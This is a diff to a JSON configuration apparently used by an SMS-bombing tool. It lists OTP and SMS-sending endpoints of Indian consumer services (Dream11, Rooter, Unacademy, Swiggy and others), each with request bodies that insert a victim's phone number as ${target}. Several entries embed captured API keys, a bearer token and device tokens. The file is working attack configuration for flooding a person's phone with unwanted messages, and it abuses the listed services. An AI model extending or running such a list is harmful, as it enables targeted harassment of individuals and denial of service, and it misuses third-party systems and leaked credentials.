@@ -13,7 +13,7 @@
         "url": "https://www.netmeds.com/mst/rest/v1/id/details/${target}",
         "method": "GET",
         "headers": {},
-        "data": {}
+        "data": ""
     },
     "2": {
         "url": "https://blinkit.com/v2/accounts/",
@@ -65,7 +65,7 @@
             "x-api-key": "qGuMZcWGxZpgd8uSH4rgkal4v1evAlCd",
             "phone_number": "${target}"
         },
-        "data": {}
+        "data": ""
     },
     "7": {
         "url": "https://www.swiggy.com/dapi/auth/sms-otp",
@@ -99,6 +99,95 @@
             "templateType": "WEBSITE_SMS_REQUEST",
             "countryCode": "91",
             "phoneNumber": "${target}"
+        }
+    },
+    "10": {
+        "url": "https://api.dream11.com/sendsmslink",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+            "Content-type": "application/x-www-form-urlencoded"
+        },
+        "data": "siteId=1&mobileNum=${target}&appType=androidfull&abtest=2&ran=1.58"
+    },
+    "11": {
+        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
+        "method": "POST",
+        "headers": {},
+        "data": {
+            "mobile": "${target}",
+            "deviceId": "14b96299-88f6-4e16-a052-b281d6be0aee",
+            "deviceName": "",
+            "refCode": "",
+            "isPlaycircle": false
+        }
+    },
+    "12": {
+        "url": "https://auth.rooter.io/auth/otp",
+        "method": "POST",
+        "headers": {
+            "device-type": "web",
+            "app-version": "1.0.5",
+            "device-id": "ca1d26f0-6154-11ef-b6c1-af61b646f12b",
+            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIwMDU0NjY3NjksInNJZCI6IjM2MDU0ZDM4LWI0MjUtNDZhZC05YmExLTBmNzg4NTk2MDcyOCIsInJvbGVzIjpbXSwiZGV2aWNlIjoid2ViIiwic2ZDcmVhdGVkQXQiOjE3MjQ0MjAyMjYsImlzVmVyaWZpZWQiOmZhbHNlLCJ1c2VyUm9sZXMiOnt9LCJpYXQiOjE3MjQ0MjAyMjYsImV4cCI6MTcyODMwODIyNn0.MxdBWjtyMlqy4mp78rQf1PWEjnxb9tSB586CN0kjUqc"
+        },
+        "data": {
+            "countryCode": "IN",
+            "mobile": "+91${target}",
+            "smsToken": "asdg1234567"
+        }
+    },
+    "13": {
+        "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=${target}&newOtp=true&retry=false&testparamsp=true",
+        "method": "GET",
+        "headers": {},
+        "data": ""
+    },
+    "14": {
+        "url": "https://apigate.abfrl.in/otp",
+        "method": "POST",
+        "headers": {
+            "devicetype": "desktop"
+        },
+        "data": {
+            "brand": "as",
+            "customerId": 0,
+            "cartId": 0,
+            "fcmToken": "111",
+            "version": "1.2",
+            "validateHash": false,
+            "geoLocation": {
+                "latitude": 343,
+                "longitude": 343
+            },
+            "latitude": "",
+            "longitude": "",
+            "deviceid": "5d653a2-cb6b-45e-b551-b12ca27fe42",
+            "devicetoken": "cdab4ed1360b457c035e5463e5fc72c5.1724421697",
+            "hash": "2cdcdb6d6bb302ac8d17fde68a9fa5d3.63d292c954c368a09cb59157ad2c80ab",
+            "sessionId": "cdab4ed1360b457c035e5463e5fc72c5",
+            "utmSource": "",
+            "mobile": "${target}",
+            "supportonlynewerversion": 1,
+            "shopId": 35,
+            "brandShopIds": "2",
+            "mode": "register",
+            "currentDomain": "allensolly",
+            "deviceId": "5d653a2-cb6b-45e-b551-b12ca27fe42",
+            "deviceToken": "cdab4ed1360b457c035e5463e5fc72c5.1724421697"
+        }
+    },
+    "15": {
+        "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
+        "method": "POST",
+        "headers": {},
+        "data": {
+            "phone": "${target}",
+            "country_code": "IN",
+            "otp_type": 1,
+            "email": "",
+            "send_otp": true,
+            "is_un_teach_user": false
         }
     }
 }
